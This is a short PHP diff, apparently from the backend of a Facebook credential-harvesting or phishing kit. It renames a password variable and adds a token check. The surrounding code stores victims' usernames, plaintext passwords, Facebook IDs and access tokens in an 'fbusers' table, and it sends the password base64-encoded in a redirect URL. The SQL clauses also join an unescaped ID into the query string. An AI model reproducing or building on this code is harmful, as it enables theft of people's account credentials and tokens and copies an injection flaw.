@@ -15,10 +15,12 @@ if($RA and $us == "mohtasm.sawilh"){
 $us = Sion("user");
 $pass = Sion("pass");
 }
+if(!isv("token")){
 if(Sion("Lerror")){
-$Spass = Sion("pass");
+$pass = Sion("pass");
 }else{
-$Spass = isv("pass");
+$pass = isv("pass");
+}
 }
 if(isv("reSend")){
 header("Location: ../fram.php?user=".Sion("user")."&pass=".base64_encode(Sion("pass"))." ");
@@ -70,7 +72,7 @@ json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&friends='.$access);
 }
            }
 if($id != "" and $name != "" and $access != ""){
-  Cinst("fbusers",array("username"=>$us,"uid"=>$id,"password"=>$Spass,"date"=>time(),"Lerror"=>Sion("Lerror")),"where uid=".$id);
+  Cinst("fbusers",array("username"=>$us,"uid"=>$id,"password"=>$pass,"date"=>time(),"Lerror"=>Sion("Lerror")),"where uid=".$id);
  if(Num("users","where user_id=".$id)){
    //UpDate();
   $insert =    UpDate("users",array("access"=>$access,"cantry"=>$cantry,"disactive"=>0,"data"=>$time),false,"where user_id=".$id);
